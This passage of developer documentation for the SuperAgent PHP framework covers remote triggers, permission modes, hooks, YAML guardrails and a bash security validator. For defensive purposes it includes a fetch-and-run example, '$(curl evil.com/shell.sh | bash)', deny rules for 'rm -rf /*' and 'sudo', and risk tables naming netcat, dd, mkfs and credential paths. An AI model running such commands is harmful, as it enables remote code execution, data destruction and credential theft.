    cronExpression: $utcCron,
);
```

#### With MCP connections

```php
$trigger = $manager->create(
    name: 'Database health check',
    prompt: 'Use the database MCP server to check table sizes and index health.',
    mcpConnections: [
        [
            'name' => 'postgres-mcp',
            'type' => 'http',
            'url' => 'https://mcp.internal.example.com/postgres',
        ],
    ],
);
```

#### Managing triggers

```php
// List all triggers
$triggers = $manager->list();
foreach ($triggers as $trigger) {
    echo "{$trigger->name} ({$trigger->id}): {$trigger->status}\n";
    if ($trigger->cronExpression) {
        echo "  Cron: {$trigger->cronExpression}\n";
    }
    if ($trigger->lastRunAt) {
        echo "  Last run: {$trigger->lastRunAt}\n";
    }
}

// Get a specific trigger
$trigger = $manager->get('trig_abc123');

// Update a trigger
$updated = $manager->update('trig_abc123', [
    'enabled' => false,
    'cron_expression' => '0 10 * * 1-5',  // Change to 10 AM
]);

// Run a trigger immediately (bypass cron schedule)
$runResult = $manager->run('trig_abc123');

// Delete a trigger
$manager->delete('trig_abc123');
```

#### Using the built-in tools

The `RemoteTriggerTool` and `ScheduleCronTool` are available as built-in tools that the LLM can invoke during conversation:

```php
use SuperAgent\Tools\Builtin\RemoteTriggerTool;
use SuperAgent\Tools\Builtin\ScheduleCronTool;

$remoteTrigger = new RemoteTriggerTool();
$result = $remoteTrigger->execute([
    'action' => 'create',
    'data' => [
        'name' => 'Weekly cleanup',
        'prompt' => 'Clean up stale branches.',
    ],
]);

$cronTool = new ScheduleCronTool();
$result = $cronTool->execute([
    'action' => 'create',
    'data' => [
        'name' => 'Nightly tests',
        'cron' => '0 2 * * *',
    ],
]);
```

### API Reference

#### `RemoteAgentTask`

| Property | Type | Description |
|----------|------|-------------|
| `id` | `string` | Unique trigger ID |
| `name` | `string` | Human-readable name |
| `cronExpression` | `?string` | Cron expression (UTC) |
| `enabled` | `bool` | Whether the trigger is active |
| `taskType` | `string` | Task type (default: `remote-agent`) |
| `jobConfig` | `array` | Full CCR job configuration |
| `status` | `string` | Current status (`idle`, `running`, etc.) |
| `createdAt` | `?string` | Creation timestamp |
| `lastRunAt` | `?string` | Last execution timestamp |
| `mcpConnections` | `array` | MCP server connections |

| Method | Description |
|--------|-------------|
| `fromArray(array $data)` | (static) Create from API response |
| `toArray()` | Serialize to array |

#### `RemoteAgentManager`

| Method | Returns | Description |
|--------|---------|-------------|
| `create(name, prompt, cron?, model?, tools?, gitUrl?, mcp?)` | `RemoteAgentTask` | Create a trigger |
| `list()` | `RemoteAgentTask[]` | List all triggers |
| `get(triggerId)` | `RemoteAgentTask` | Get trigger by ID |
| `update(triggerId, updates)` | `RemoteAgentTask` | Update trigger config |
| `run(triggerId)` | `array` | Run trigger immediately |
| `delete(triggerId)` | `bool` | Delete a trigger |
| `cronToUtc(localCron, timezone)` | `string` | (static) Convert cron to UTC |

#### `RemoteTriggerTool`

| Property | Value |
|----------|-------|
| Name | `RemoteTriggerTool` |
| Category | `automation` |
| Input | `action` (string), `data` (object) |
| Read-only | No |

#### `ScheduleCronTool`

| Property | Value |
|----------|-------|
| Name | `ScheduleCronTool` |
| Category | `automation` |
| Input | `action` (string), `data` (object) |
| Read-only | No |

### Examples

#### Complete trigger lifecycle

```php
use SuperAgent\Remote\RemoteAgentManager;

$manager = new RemoteAgentManager(apiKey: getenv('ANTHROPIC_API_KEY'));

// Create
$trigger = $manager->create(
    name: 'PR Review Bot',
    prompt: 'Review all open PRs. For each PR, check code quality, test coverage, and leave constructive comments.',
    cronExpression: '0 8 * * 1-5',  // 8 AM UTC weekdays
    model: 'claude-sonnet-4-6',
    allowedTools: ['Bash', 'Read', 'Glob', 'Grep'],
    gitRepoUrl: 'https://github.com/my-org/backend.git',
);

echo "Created trigger: {$trigger->id}\n";

// Test it immediately
$result = $manager->run($trigger->id);
echo "Run result: " . json_encode($result) . "\n";

// Check status
$updated = $manager->get($trigger->id);
echo "Status: {$updated->status}\n";
echo "Last run: {$updated->lastRunAt}\n";

// Disable during maintenance
$manager->update($trigger->id, ['enabled' => false]);

// Re-enable
$manager->update($trigger->id, ['enabled' => true]);

// Clean up
$manager->delete($trigger->id);
```

#### Timezone conversion

```php
use SuperAgent\Remote\RemoteAgentManager;

// Convert "9 AM Eastern" to UTC cron
$utc = RemoteAgentManager::cronToUtc('0 9 * * *', 'America/New_York');
// Result: '0 14 * * *' (during EST, UTC-5)

// Tokyo 3 PM daily
$utc = RemoteAgentManager::cronToUtc('0 15 * * *', 'Asia/Tokyo');
// Result: '0 6 * * *' (JST is UTC+9)
```

### Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| "Remote API error (401)" | Invalid API key | Check `ANTHROPIC_API_KEY` |
| "Remote API error (403)" | Missing organization ID or insufficient permissions | Set `organizationId` parameter |
| Trigger not running | `enabled` is false | Update trigger with `['enabled' => true]` |
| Cron schedule off by hours | Timezone not converted | Use `cronToUtc()` to convert local times |
| MCP connection failing | MCP server not accessible from remote | Ensure MCP server has a public endpoint |
| Non-standard cron rejected | Invalid cron expression | Use standard 5-field cron (minute hour day month weekday) |

---

## 4. Permission System

> Control which tools and commands the agent can execute through 6 permission modes, configurable rules, bash command classification, and integration with guardrails and hooks.

### Overview

The Permission System is the gatekeeper for every tool invocation. It evaluates a multi-step decision pipeline that checks deny rules, guardrails, bash security classification, tool-specific logic, and mode-based policies. The result is always one of three behaviors: **allow**, **deny**, or **ask** (prompt the user).

Key classes:

| Class | Role |
|---|---|
| `PermissionEngine` | Central decision engine with 6-step evaluation pipeline |
| `PermissionMode` | Enum of 6 permission modes |
| `PermissionRule` | A single allow/deny/ask rule with tool name and content pattern |
| `PermissionRuleParser` | Parses rule strings like `Bash(git *)` into `PermissionRuleValue` |
| `PermissionRuleValue` | Parsed rule: tool name + optional content pattern |
| `BashCommandClassifier` | Classifies bash commands by risk level and category |
| `PermissionDecision` | The outcome: allow/deny/ask with reason and suggestions |
| `PermissionDenialTracker` | Tracks denial history for analytics |

### Permission Modes

The system supports 6 modes that determine the overall permission stance:

| Mode | Enum Value | Behavior |
|---|---|---|
| **Default** | `default` | Standard rules apply; unmatched actions prompt the user |
| **Plan** | `plan` | Even allowed actions require explicit approval |
| **Accept Edits** | `acceptEdits` | Auto-allows file editing tools (Edit, MultiEdit, Write, NotebookEdit) |
| **Bypass Permissions** | `bypassPermissions` | Auto-allows everything (dangerous) |
| **Don't Ask** | `dontAsk` | Never prompts; auto-denies anything that would have been "ask" |
| **Auto** | `auto` | Uses an auto-classifier to decide allow/deny for "ask" actions |

```php
use SuperAgent\Permissions\PermissionMode;

$mode = PermissionMode::DEFAULT;
echo $mode->getTitle();   // "Standard Permissions"
echo $mode->getSymbol();  // Lock emoji
echo $mode->getColor();   // "green"
echo $mode->isHeadless(); // false (only DONT_ASK and AUTO are headless)
```

### Configuration

#### Permission Rules in Settings

Rules are configured in `settings.json` under three lists:

```json
{
  "permissions": {
    "mode": "default",
    "allow": [
      "Bash(git status*)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(npm test*)",
      "Read",
      "Glob",
      "Grep"
    ],
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(sudo *)",
      "Write(.env*)"
    ],
    "ask": [
      "Bash(curl *)",
      "Bash(wget *)",
      "Write(/etc/*)"
    ]
  }
}
```

#### Rule Syntax

Rules follow the format `ToolName` or `ToolName(content-pattern)`:

| Rule | Matches |
|---|---|
| `Bash` | All Bash tool calls |
| `Bash(git status*)` | Bash commands starting with `git status` |
| `Bash(npm install*)` | Bash commands starting with `npm install` |
| `Read` | All Read tool calls |
| `Write(.env*)` | Write calls to files starting with `.env` |
| `Edit(/etc/*)` | Edit calls to files starting with `/etc/` |

Wildcards: A trailing `*` matches any suffix (prefix matching). Without `*`, the rule requires an exact match.

Special characters `(`, `)`, and `\` can be escaped with backslash.

```php
use SuperAgent\Permissions\PermissionRuleParser;
use SuperAgent\Permissions\PermissionRuleValue;

$parser = new PermissionRuleParser();

$rule = $parser->parse('Bash(git status*)');
// $rule->toolName === 'Bash'
// $rule->ruleContent === 'git status*'

$rule = $parser->parse('Read');
// $rule->toolName === 'Read'
// $rule->ruleContent === null (matches all Read calls)

$rule = $parser->parse('Bash(npm install*)');
// $rule->toolName === 'Bash'
// $rule->ruleContent === 'npm install*'
```

#### PermissionRule Matching

```php
use SuperAgent\Permissions\PermissionRule;
use SuperAgent\Permissions\PermissionRuleSource;
use SuperAgent\Permissions\PermissionBehavior;
use SuperAgent\Permissions\PermissionRuleValue;

$rule = new PermissionRule(
    source: PermissionRuleSource::RUNTIME,
    ruleBehavior: PermissionBehavior::ALLOW,
    ruleValue: new PermissionRuleValue('Bash', 'git *'),
);

$rule->matches('Bash', 'git status');       // true
$rule->matches('Bash', 'git push origin');  // true
$rule->matches('Bash', 'npm install');      // false
$rule->matches('Read', 'file.txt');         // false

// Rule without content pattern matches all invocations of that tool
$rule = new PermissionRule(
    source: PermissionRuleSource::RUNTIME,
    ruleBehavior: PermissionBehavior::ALLOW,
    ruleValue: new PermissionRuleValue('Read'),
);

$rule->matches('Read', '/any/file.txt');    // true
$rule->matches('Read', null);               // true
```

### Usage

#### Creating a PermissionEngine

```php
use SuperAgent\Permissions\PermissionEngine;
use SuperAgent\Permissions\PermissionContext;
use SuperAgent\Permissions\PermissionMode;

$context = new PermissionContext(
    mode: PermissionMode::DEFAULT,
    alwaysAllowRules: $allowRules,   // PermissionRule[]
    alwaysDenyRules: $denyRules,     // PermissionRule[]
    alwaysAskRules: $askRules,       // PermissionRule[]
);

$engine = new PermissionEngine(
    callback: $permissionCallback,    // PermissionCallbackInterface
    context: $context,
    guardrailsEngine: $guardrailsEngine, // optional
);
```

#### Checking Permissions

```php
$decision = $engine->checkPermission($tool, $input);

switch ($decision->behavior) {
    case PermissionBehavior::ALLOW:
        // Execute the tool
        break;

    case PermissionBehavior::DENY:
        echo "Denied: {$decision->message}\n";
        echo "Reason: {$decision->reason->type}\n";
        break;

    case PermissionBehavior::ASK:
        // Show permission prompt with suggestions
        echo "Permission needed: {$decision->message}\n";
        foreach ($decision->suggestions as $suggestion) {
            echo "  - {$suggestion->label}\n";
        }
        break;
}
```

### Decision Pipeline

The `PermissionEngine::checkPermission()` method follows a 6-step evaluation pipeline:

#### Step 1: Rule-Based Permissions (bypass-immune)

Checks deny rules first, then ask rules. These cannot be overridden by any mode.

- **Deny rules**: If matched, immediately returns `deny`
- **Ask rules**: If matched, returns `ask`
- **Dangerous paths**: Checks for sensitive paths (`.git/`, `.env`, `.ssh/`, `credentials`, `/etc/`, etc.)

#### Step 1.5: Guardrails DSL Evaluation

If a `GuardrailsEngine` is configured, evaluates guardrail rules against a `RuntimeContext`. Guardrail results that map to permission actions (`deny`, `allow`, `ask`) are used; non-permission actions (`warn`, `log`, `downgrade_model`) fall through.

#### Step 2: Bash Command Classification

For Bash tool calls (when the `bash_classifier` experimental feature is enabled), the `BashCommandClassifier` evaluates the command:

- **Critical/High risk**: Returns `ask` with the risk reason
- **Approval required**: Returns `ask` in non-bypass modes
- **Low risk**: Falls through (does not auto-allow)

#### Step 3: Tool Interaction Requirements

If the tool declares `requiresUserInteraction()`, returns `ask`.

#### Step 4: Mode-Based Allowance

- **Bypass mode**: Returns `allow` for everything
- **Accept Edits mode**: Returns `allow` for editing tools (Edit, MultiEdit, Write, NotebookEdit)

#### Step 5: Allow Rules

Checks the allow rule list. If matched, returns `allow`.

#### Step 6: Default

If nothing else matched, returns `ask` with generated suggestions for the user.

#### Mode Transformations

After the pipeline produces a decision, mode-specific transformations are applied:

| Mode | Transformation |
|---|---|
| **Don't Ask** | `ask` decisions become `deny` (auto-denies) |
| **Plan** | `allow` decisions become `ask` (requires explicit approval) |
| **Auto** | `ask` decisions are routed to an auto-classifier that returns `allow` or `deny` |

### Bash Command Classification

The `BashCommandClassifier` analyzes shell commands in two phases:

#### Phase 1: Security Validator (23 checks)

The `BashSecurityValidator` performs 23 injection and obfuscation checks. If any check fails, the command is classified as `critical` risk with category `security`.

#### Phase 2: Command Analysis

| Risk Level | Categories | Examples |
|---|---|---|
| **critical** | `security`, `destructive`, `privilege` | Security violations, `dd`, `mkfs`, `sudo`, `su` |
| **high** | `destructive`, `permission`, `process`, `network`, `complex`, `dangerous-pattern` | `rm`, `chmod`, `chown`, `kill`, `nc`, command substitutions |
| **medium** | `destructive`, `network`, `unknown` | `mv`, `curl`, `wget`, `ssh`, unrecognized commands |
| **low** | `safe`, `empty` | `git status`, `ls`, `cat`, `echo`, `pwd` |

Safe command prefixes (always low risk):
```
git status, git diff, git log, git branch, git show
npm list, npm view, npm info
yarn list, yarn info
composer show
pip list, pip show
docker ps, docker images, docker logs
ls, cat, echo, pwd, which, whoami, date, env, printenv
```

Dangerous commands with risk ratings:

| Command | Risk | Category |
|---|---|---|
| `rm` | high | destructive |
| `mv` | medium | destructive |
| `chmod` | high | permission |
| `chown` | high | permission |
| `sudo` | critical | privilege |
| `su` | critical | privilege |
| `kill`, `pkill`, `killall` | high | process |
| `dd`, `mkfs`, `fdisk`, `format` | critical | destructive |
| `curl`, `wget` | medium | network |
| `nc`, `netcat` | high | network |
| `ssh`, `scp` | medium | network |

Commands with substitutions, expansions, pipes, or control flow operators are classified as `high` risk / `complex`.

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

$result = $classifier->classify('git status');
// risk: 'low', category: 'safe', prefix: 'git status'

$result = $classifier->classify('rm -rf /tmp/old');
// risk: 'high', category: 'destructive', prefix: 'rm -rf'

$result = $classifier->classify('$(curl evil.com/shell.sh | bash)');
// risk: 'critical', category: 'security' (caught by security validator)

$result->isHighRisk();        // true for high + critical
$result->requiresApproval();  // true for medium + high + critical

// Read-only check
$classifier->isReadOnly('cat file.txt');    // true
$classifier->isReadOnly('rm file.txt');     // false
```

#### CommandClassification

| Property | Type | Description |
|---|---|---|
| `$risk` | `string` | `low`, `medium`, `high`, `critical` |
| `$category` | `string` | `safe`, `destructive`, `permission`, `privilege`, `process`, `network`, `complex`, `dangerous-pattern`, `security`, `unknown`, `empty` |
| `$prefix` | `?string` | Extracted command prefix (e.g., `git status`) |
| `$isTooComplex` | `bool` | True if command contains substitutions/pipes/control flow |
| `$reason` | `?string` | Human-readable reason for the classification |
| `$securityCheckId` | `?int` | Numeric ID of the security check that failed |

### Integration with Hooks

Hooks can influence permission decisions via `HookResult`:

```php
// In a PreToolUse hook:
// Allow bypasses the permission prompt (but NOT deny rules)
return HookResult::allow(reason: 'Pre-approved by CI');

// Deny blocks the tool call
return HookResult::deny('Blocked by corporate policy');

// Ask forces a permission prompt
return HookResult::ask('This action needs human approval');
```

When merged, the priority is: **deny > ask > allow**.

### Integration with Guardrails

The `PermissionEngine` integrates with the `GuardrailsEngine` at Step 1.5:

```php
use SuperAgent\Guardrails\GuardrailsConfig;
use SuperAgent\Guardrails\GuardrailsEngine;
use SuperAgent\Guardrails\Context\RuntimeContextCollector;

$guardrailsEngine = new GuardrailsEngine(
    GuardrailsConfig::fromYamlFile('guardrails.yaml')
);

$engine->setGuardrailsEngine($guardrailsEngine);
$engine->setRuntimeContextCollector($contextCollector);
```

The guardrails DSL evaluation happens after hardcoded deny/ask rules but before bash classification, giving you fine-grained YAML-driven control over permissions.

### Permission Suggestions

When the engine returns `ask`, it generates `PermissionUpdate` suggestions to help the user create permanent rules:

```php
$decision = $engine->checkPermission($tool, $input);

foreach ($decision->suggestions as $suggestion) {
    echo "{$suggestion->label}\n";
    // Examples:
    // "Allow this specific action"
    // "Allow 'git' commands"
    // "Allow all Bash actions"
    // "Enter bypass mode (dangerous)"
}
```

Suggestions include:
1. Allow the exact action (full content match)
2. Allow the command prefix with wildcard
3. Allow all invocations of the tool
4. Enter bypass mode

### API Reference

#### `PermissionEngine`

| Method | Description |
|---|---|
| `__construct(PermissionCallbackInterface $callback, PermissionContext $context, ?GuardrailsEngine $guardrailsEngine)` | Create engine |
| `checkPermission(Tool $tool, array $input): PermissionDecision` | Evaluate permission for a tool call |
| `getContext(): PermissionContext` | Get current context |
| `setContext(PermissionContext $context): void` | Update context (e.g., change mode) |
| `setGuardrailsEngine(?GuardrailsEngine $engine): void` | Set/unset guardrails integration |
| `setRuntimeContextCollector(?RuntimeContextCollector $collector): void` | Set context collector for guardrails |
| `getDenialTracker(): PermissionDenialTracker` | Get denial tracking history |

#### `PermissionMode` (enum)

| Case | Value | Headless? | Description |
|---|---|---|---|
| `DEFAULT` | `default` | No | Standard permission rules |
| `PLAN` | `plan` | No | Requires explicit approval for all actions |
| `ACCEPT_EDITS` | `acceptEdits` | No | Auto-allows file editing tools |
| `BYPASS_PERMISSIONS` | `bypassPermissions` | No | Auto-allows everything |
| `DONT_ASK` | `dontAsk` | Yes | Auto-denies anything that would prompt |
| `AUTO` | `auto` | Yes | Uses auto-classifier for decisions |

#### `PermissionRule`

| Method | Description |
|---|---|
| `matches(string $toolName, ?string $content): bool` | Check if rule matches a tool call |
| `toString(): string` | String representation |

#### `PermissionRuleParser`

| Method | Description |
|---|---|
| `parse(string $rule): PermissionRuleValue` | Parse a rule string into tool name + content pattern |

#### `BashCommandClassifier`

| Method | Description |
|---|---|
| `classify(string $command): CommandClassification` | Classify a bash command |
| `isReadOnly(string $command): bool` | Check if a command is read-only |

### Examples

#### Typical Project Configuration

```json
{
  "permissions": {
    "mode": "default",
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "Bash(git status*)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(git branch*)",
      "Bash(npm test*)",
      "Bash(npm run lint*)",
      "Bash(composer test*)",
      "Bash(php artisan test*)",
      "Bash(ls *)",
      "Bash(cat *)",
      "Bash(pwd)"
    ],
    "deny": [
      "Bash(sudo *)",
      "Bash(rm -rf /*)",
      "Bash(chmod 777*)",
      "Write(.env*)",
      "Write(credentials*)"
    ],
    "ask": [
      "Bash(git push*)",
      "Bash(git commit*)",
      "Bash(npm publish*)",
      "Bash(curl *)",
      "Write(/etc/*)"
    ]
  }
}
```

#### CI/CD Headless Configuration

```json
{
  "permissions": {
    "mode": "dontAsk",
    "allow": [
      "Read",
      "Glob",
      "Grep",
      "Write",
      "Edit",
      "Bash(git *)",
      "Bash(npm *)",
      "Bash(composer *)"
    ],
    "deny": [
      "Bash(sudo *)",
      "Bash(rm -rf /*)"
    ]
  }
}
```

### Troubleshooting

**Tool always denied** -- Check deny rules first; they are bypass-immune and evaluated before everything else. Also check if `dontAsk` mode is active (converts all `ask` to `deny`).

**Tool always prompting** -- In `plan` mode, even allowed actions become `ask`. Check the active mode with `$engine->getContext()->mode`.

**Bash commands classified incorrectly** -- The classifier treats any command with `$()`, backticks, pipes, `&&`, `||`, or `;` as "too complex" and assigns `high` risk. This is intentional for security.

**Guardrails not evaluated** -- Both `setGuardrailsEngine()` and `setRuntimeContextCollector()` must be set for guardrails to participate in the decision pipeline.

**Permission suggestions not appearing** -- Suggestions are only generated for `ask` decisions. `allow` and `deny` decisions do not include suggestions.

**"Empty permission rule" error** -- The rule string passed to `PermissionRuleParser::parse()` is empty or whitespace-only.

---

## 5. Hook System

> Intercept and control agent behavior at every stage -- from tool execution to session lifecycle -- using composable, configurable hooks that can allow, deny, modify, or observe operations.

### Overview

The Hook System provides a middleware-like pipeline for intercepting agent events. Hooks are organized by event type and matched against tool names using the same rule syntax as the Permission System. Each hook produces a `HookResult` that can continue execution, stop it, modify tool inputs, inject system messages, or control permission behavior.

Key classes:

| Class | Role |
|---|---|
| `HookRegistry` | Central registry: registers hooks, executes them for events, manages lifecycle |
| `HookEvent` | Enum of 21 hookable events |
| `HookType` | Enum of hook implementation types (command, prompt, http, agent, callback, function) |
| `HookInput` | Immutable input payload passed to hooks |
| `HookResult` | Outcome of hook execution with control flow directives |
| `HookMatcher` | Matches hooks to tool invocations using permission rule syntax |
| `StopHooksPipeline` | Specialized pipeline for OnStop/TaskCompleted/TeammateIdle hooks |

### Hook Events

#### Lifecycle Events

| Event | Value | Description |
|---|---|---|
| `SessionStart` | `SessionStart` | Fired when a new session begins |
| `SessionEnd` | `SessionEnd` | Fired when a session ends |
| `OnStop` | `OnStop` | Fired when the agent is stopping |
| `OnQuery` | `OnQuery` | Fired when a query is received |
| `OnMessage` | `OnMessage` | Fired when a message is received |
| `OnThinkingComplete` | `OnThinkingComplete` | Fired when extended thinking completes |

#### Tool Execution Events

| Event | Value | Description |
|---|---|---|
| `PreToolUse` | `PreToolUse` | Fired before a tool is executed |
| `PostToolUse` | `PostToolUse` | Fired after successful tool execution |
| `PostToolUseFailure` | `PostToolUseFailure` | Fired when tool execution fails |

#### Permission Events

| Event | Value | Description |
|---|---|---|
| `PermissionRequest` | `PermissionRequest` | Fired when permission is requested |
| `PermissionDenied` | `PermissionDenied` | Fired when permission is denied |

#### User Interaction Events

| Event | Value | Description |
|---|---|---|
| `UserPromptSubmit` | `UserPromptSubmit` | Fired when user submits a prompt |
| `Notification` | `Notification` | Fired for general notifications |

#### System Events

| Event | Value | Description |
|---|---|---|
| `PreCompact` | `PreCompact` | Fired before conversation compacting |
| `PostCompact` | `PostCompact` | Fired after conversation compacting |
| `ConfigChange` | `ConfigChange` | Fired when configuration changes |

#### Task Events

| Event | Value | Description |
|---|---|---|
| `TaskCreated` | `TaskCreated` | Fired when a task is created |
| `TaskCompleted` | `TaskCompleted` | Fired when a task completes |

#### Teammate Events

| Event | Value | Description |
|---|---|---|
| `TeammateIdle` | `TeammateIdle` | Fired when a teammate agent becomes idle |
| `SubagentStop` | `SubagentStop` | Fired when a sub-agent stops |

#### File System Events

| Event | Value | Description |
|---|---|---|
| `CwdChanged` | `CwdChanged` | Fired when current directory changes |
| `FileChanged` | `FileChanged` | Fired when watched files change |

### Configuration

Hooks are configured in `settings.json` (project-level `.superagent/settings.json` or user-level):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "echo 'About to run bash command'",
            "timeout": 10
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "php-cs-fixer fix $TOOL_INPUT_FILE_PATH",
            "async": true
          }
        ]
      }
    ]
  }
}
```

### Hook Types

| Type | Value | Description |
|---|---|---|
| `command` | `command` | Execute a shell command |
| `prompt` | `prompt` | Inject a prompt |
| `http` | `http` | Make an HTTP request |
| `agent` | `agent` | Run an agent |
| `callback` | `callback` | Execute a PHP callback |
| `function` | `function` | Execute a PHP function |

### HookResult Control Flow

Results are merged when multiple hooks fire: **deny > ask > allow**.

### Troubleshooting

**"Unknown hook event: X"** -- Check the exact casing (e.g., `PreToolUse`, not `pre_tool_use`).

**Hook not firing** -- Verify the matcher pattern matches the tool name. A `null` matcher matches everything.

**Permission behavior not taking effect** -- Hook `allow` does NOT bypass settings deny rules.

---

## 6. Guardrails DSL

> Define composable security policies as declarative YAML rules that evaluate at runtime to control tool execution, enforce budgets, limit rates, and integrate with the permission system.

### Overview

The Guardrails DSL provides a rule-based policy engine that sits between tool invocation and the Permission Engine. Rules are organized into priority-ordered groups, each containing conditions (composable with `all_of`/`any_of`/`not`) and actions (`deny`, `allow`, `ask`, `warn`, `log`, `pause`, `rate_limit`, `downgrade_model`). The engine evaluates rules against a `RuntimeContext` snapshot that captures tool info, session cost, token usage, agent state, and timing.

Key classes:

| Class | Role |
|---|---|
| `GuardrailsConfig` | Parses YAML rule files, validates, sorts groups by priority |
| `GuardrailsEngine` | Evaluates rule groups against a `RuntimeContext` |
| `GuardrailsResult` | Match outcome; converts to `PermissionDecision` or `HookResult` |
| `ConditionFactory` | Parses YAML condition trees into `ConditionInterface` objects |
| `RuleGroup` | Named, prioritized, toggleable group of rules |
| `Rule` | Single rule: condition + action + message + params |
| `RuleAction` | Enum of 8 action types |
| `RuntimeContext` | Immutable snapshot of all runtime state for evaluation |

### Configuration

```yaml
version: "1.0"

defaults:
  evaluation: first_match    # first_match | all_matching
  default_action: ask        # fallback action

groups:
  security:
    priority: 100            # higher = evaluated first
    enabled: true
    description: "Core security rules"
    rules:
      - name: block-env-access
        conditions:
          tool: { name: "Read" }
          tool_content: { contains: ".env" }
        action: deny
        message: "Access to .env files is blocked by security policy"
```

### 7 Condition Types

1. **`tool`** -- Tool name matching (exact or any-of)
2. **`tool_content`** -- Extracted content matching (contains, starts_with, matches)
3. **`tool_input`** -- Specific input field matching
4. **`session`** -- Session-level metrics (cost_usd, budget_pct, elapsed_ms)
5. **`agent`** -- Agent state (turn_count, model)
6. **`token`** -- Token statistics
7. **`rate`** -- Sliding window rate limiting

### 8 Action Types

| Action | Blocks execution? | Permission action? |
|---|---|---|
| `deny` | Yes | Yes |
| `allow` | No | Yes |
| `ask` | No (waits) | Yes |
| `warn` | No | No |
| `log` | No | No |
| `pause` | Yes | No (maps to deny) |
| `rate_limit` | Yes | No (maps to deny) |
| `downgrade_model` | No | No |

### Composable Logic

```yaml
conditions:
  all_of:
    - tool: { name: "Bash" }
    - any_of:
        - tool_input: { field: command, starts_with: "rm" }
        - tool_input: { field: command, starts_with: "sudo" }
    - not:
        session: { cost_usd: { lt: 0.50 } }
```

### Troubleshooting

**"Condition config must not be empty"** -- Every rule must have at least one condition.

**"Unknown condition key: 'x'"** -- Valid keys: `all_of`, `any_of`, `not`, `tool`, `tool_content`, `tool_input`, `session`, `agent`, `token`, `rate`.

---

## 7. Bash Security Validator

> Comprehensive security layer that performs 23 injection and obfuscation checks on bash commands before execution, classifies commands by risk level, and integrates with the permission engine to auto-allow read-only commands.

### Overview

The bash security system consists of two classes:

- **`BashSecurityValidator`** -- Performs 23 individual security checks that detect shell injection, parser differential attacks, obfuscated flags, dangerous redirections, and more. Each check has a numeric ID for logging and diagnostics.
- **`BashCommandClassifier`** -- Wraps the validator and adds risk classification (low/medium/high/critical), safe-command prefix matching, and dangerous-command detection.

### The 23 Security Checks

| ID | Constant | What it detects |
|----|----------|----------------|
| 1 | `CHECK_INCOMPLETE_COMMANDS` | Fragments starting with tab, flag, or operator |
| 2 | `CHECK_JQ_SYSTEM_FUNCTION` | `jq` with `system()` call |
| 3 | `CHECK_JQ_FILE_ARGUMENTS` | `jq` with file-reading flags |
| 4 | `CHECK_OBFUSCATED_FLAGS` | ANSI-C quoting, locale quoting, empty-quote flag obfuscation |
| 5 | `CHECK_SHELL_METACHARACTERS` | Unquoted `;`, `&`, `\|` in arguments |
| 6 | `CHECK_DANGEROUS_VARIABLES` | Variables in redirection/pipe context |
| 7 | `CHECK_NEWLINES` | Newlines separating commands |
| 8 | `CHECK_COMMAND_SUBSTITUTION` | `$()`, backticks, `${}`, `<()`, `>()`, `=()` |
| 9 | `CHECK_INPUT_REDIRECTION` | Input redirection `<` |
| 10 | `CHECK_OUTPUT_REDIRECTION` | Output redirection `>` |
| 11 | `CHECK_IFS_INJECTION` | `$IFS` or `${...IFS...}` references |
| 12 | `CHECK_GIT_COMMIT_SUBSTITUTION` | Command substitution in `git commit` messages |
| 13 | `CHECK_PROC_ENVIRON_ACCESS` | Access to `/proc/*/environ` |
| 14 | `CHECK_MALFORMED_TOKEN_INJECTION` | Unbalanced quotes/parens + command separators |
| 15 | `CHECK_BACKSLASH_ESCAPED_WHITESPACE` | `\` before spaces/tabs outside quotes |
| 16 | `CHECK_BRACE_EXPANSION` | Comma or sequence brace expansion |
| 17 | `CHECK_CONTROL_CHARACTERS` | Non-printable control chars |
| 18 | `CHECK_UNICODE_WHITESPACE` | Non-breaking spaces, zero-width chars |
| 19 | `CHECK_MID_WORD_HASH` | `#` preceded by non-whitespace |
| 20 | `CHECK_ZSH_DANGEROUS_COMMANDS` | Zsh-specific dangerous builtins |
| 21 | `CHECK_BACKSLASH_ESCAPED_OPERATORS` | `\;`, `\|`, `\&` outside quotes |
| 22 | `CHECK_COMMENT_QUOTE_DESYNC` | Quote chars inside `#` comments |
| 23 | `CHECK_QUOTED_NEWLINE` | Newline inside quotes followed by `#` comment line |

### Read-only command prefixes (auto-allowed)

**Git:** `git status`, `git diff`, `git log`, `git show`, `git branch`, `git tag`, `git remote`, `git describe`, `git rev-parse`, `git rev-list`, `git shortlog`, `git stash list`

**Package managers:** `npm list/view/info/outdated/ls`, `yarn list/info/why`, `composer show/info`, `pip list/show/freeze`, `cargo metadata`

**Container:** `docker ps/images/logs/inspect`

**GitHub CLI:** `gh pr list/view/status/checks`, `gh issue list/view/status`, `gh run list/view`, `gh api`

**Linters:** `pyright`, `mypy`, `tsc --noEmit`, `eslint`, `phpstan`, `psalm`

**Basic tools:** `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `fd`, `wc`, `sort`, `diff`, `file`, `stat`, `du`, `df`, `echo`, `printf`, `pwd`, `which`, `whoami`, `date`, `uname`, `env`, `jq`, `test`, `true`, `false`

### Troubleshooting

| Problem | Solution |
|---------|----------|
| Safe command flagged | Ensure arguments are properly quoted |
| Complex pipe blocked | Break into individual commands or accept the approval prompt |
| Heredoc flagged | Use `$(cat <<'DELIM'...DELIM)` pattern with single-quoted delimiter |

---

## 8. Cost Autopilot

> Intelligent budget control that monitors cumulative spending and automatically takes escalating actions -- warn, compact context, downgrade model, halt -- to prevent budget overruns.

### Overview

The Cost Autopilot watches your AI agent's spending in real time and reacts when budget thresholds are crossed. The default escalation ladder is:

| Budget Used | Action | Effect |
|---|---|---|
| 50% | `warn` | Logs a warning; no automatic change |
| 70% | `compact_context` | Signals the query engine to compact older messages |
| 80% | `downgrade_model` | Switches the provider to the next cheaper model tier |
| 95% | `halt` | Stops the agent loop entirely |

The autopilot supports **session budgets** (per invocation), **monthly budgets** (across sessions), or both.

### Configuration

```php
'cost_autopilot' => [
    'enabled' => env('SUPERAGENT_COST_AUTOPILOT_ENABLED', false),
